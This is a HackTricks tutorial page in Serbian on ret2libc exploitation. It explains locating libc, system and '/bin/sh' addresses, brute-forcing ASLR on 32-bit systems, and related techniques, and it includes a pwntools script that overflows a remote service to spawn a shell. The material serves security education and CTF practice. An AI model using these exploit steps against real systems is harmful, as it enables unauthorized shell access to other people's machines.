# Ret2lib

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## **Osnovne informacije**

Suština **Ret2Libc** je preusmeravanje izvršnog toka ranjivog programa ka funkciji unutar deljene biblioteke (npr. **system**, **execve**, **strcpy**) umesto izvršavanja shell koda koji je dostavljen od strane napadača na steku. Napadač kreira payload koji menja povratnu adresu na steku tako da pokazuje na željenu bibliotečku funkciju, dok istovremeno organizuje da svi neophodni argumenti budu pravilno postavljeni prema konvenciji pozivanja.

### **Primer koraka (simplifikovan)**

* Dobiti adresu funkcije koja se poziva (npr. system) i komandu koja se poziva (npr. /bin/sh)
* Generisati ROP lanac da se prosledi prvi argument koji pokazuje na string komande i izvršni tok funkciji

## Pronalaženje adresa

* Pretpostavljajući da se `libc` koji se koristi nalazi na trenutnoj mašini, možete pronaći gde će biti učitan u memoriju sa:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Ako želite da proverite da li ASLR menja adresu libc-a, možete uraditi sledeće:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Znajući korišćeni libc, takođe je moguće pronaći offset do funkcije `system` pomoću:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Znajući korišćeni libc, takođe je moguće pronaći offset do stringa `/bin/sh` funkcije sa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Korišćenje gdb-peda / GEF

Znajući korišćenu libc biblioteku, takođe je moguće koristiti Peda ili GEF da dobijete adresu funkcije **system**, funkcije **exit** i stringa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Korišćenje /proc/\<PID>/maps

Ako proces stvara **decu** svaki put kada komunicirate s njim (mrežni server), pokušajte da **pročitate** taj fajl (verovatno će vam biti potrebna root privilegija).

Ovde možete pronaći **tačno gde je učitan libc** unutar procesa i **gde će biti učitan** za svako dete procesa.

![](<../../../.gitbook/assets/image (853).png>)

U ovom slučaju učitan je na **0xb75dc000** (Ovo će biti bazna adresa libc-a)

## Nepoznat libc

Moguće je da **ne znate koji libc učitava binarni fajl** (jer se možda nalazi na serveru do kojeg nemate pristup). U tom slučaju možete iskoristiti ranjivost da **procurete neke adrese i pronađete koji libc** biblioteku se koristi:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Takođe možete pronaći šablon pwntools-a za ovo u:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Poznavanje libc-a sa 2 offseta

Proverite stranicu [https://libc.blukat.me/](https://libc.blukat.me/) i koristite **par adresa** funkcija unutar libc-a da biste saznali **verziju koja se koristi**.

## Zaobilaženje ASLR-a u 32 bita

Ovi napadi brute-forcinga su **korisni samo za 32-bitne sisteme**.

* Ako je eksploatacija lokalna, možete pokušati da brute-force-ujete baznu adresu libc-a (korisno za 32-bitne sisteme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Ako napadate udaljeni server, možete pokušati **bruteforce-ovati adresu `libc` funkcije `usleep`**, prosleđujući kao argument 10 (na primer). Ako server u nekom trenutku **dodatno odgovori za 10 sekundi**, pronašli ste adresu ove funkcije.

## Jedan Gadget

Izvršite shell skočivši na **jednu** određenu **adresu** u libc-u:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Primer Koda

U ovom primeru, ASLR bruteforce je integrisan u kod, a ranjivi binarni fajl se nalazi na udaljenom serveru:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Primer koda za x64 Ret2lib

Proverite primer sa:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Primer ARM64 Ret2lib

U slučaju ARM64, instrukcija ret skače na lokaciju na koju pokazuje registar x30, a ne na lokaciju na koju pokazuje registar steka. Zbog toga je malo složenije.

Takođe, u ARM64 instrukcija radi ono što instrukcija radi (nije moguće skočiti usred instrukcija i transformisati ih u nove).

Proverite primer sa:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (ili puts)

Ovo omogućava **procurivanje informacija iz procesa** pozivanjem `printf`/`puts` sa određenim podacima postavljenim kao argument. Na primer, stavljanje adrese `puts` u GOT u izvršavanje `puts` će **procuriti adresu `puts` u memoriji**.

## Ret2printf

Ovo u osnovi znači zloupotrebu **Ret2lib kako bi se pretvorio u ranjivost sa formatiranim stringovima za `printf`** koristeći `ret2lib` za pozivanje printf sa vrednostima koje će je iskoristiti (zvuči beskorisno, ali je moguće):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Ostali primeri i reference

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, dajući procuru adresu funkcije u libc-u, koristeći jedan alat
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bita, ASLR omogućen ali bez PIE-a, prvi korak je popuniti prekoračenje dok se ne dođe do bajta 0x00 kanara, a zatim pozvati puts i procuriti ga. Sa kanarom se kreira ROP alatka za pozivanje puts kako bi procurila adresa puts iz GOT-a, a zatim ROP alatka za pozivanje `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bita, ASLR omogućen, bez kanara, prekoračenje steka u glavnoj funkciji iz podfunkcije. ROP alatka za pozivanje puts kako bi procurila adresu puts iz GOT-a, a zatim poziva jedan alat.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bita, bez PIE-a, bez kanara, bez relro, nx. Koristi funkciju pisanja za procurivanje adrese pisanja (libc) i poziva jedan alat.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Koristi formatiran string za procurivanje kanara sa steka i prekoračenje bafera za pozivanje sistema (nalazi se u GOT-u) sa adresom `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bita, bez relro-a, bez kanara, nx, pie. Zloupotreba lošeg indeksiranja za procurivanje adresa libc-a i hipa sa steka. Zloupotreba prekoračenja bafera za pozivanje `system('/bin/sh')` preko ret2liba (potrebna je adresa hipa da bi se zaobišla provera).
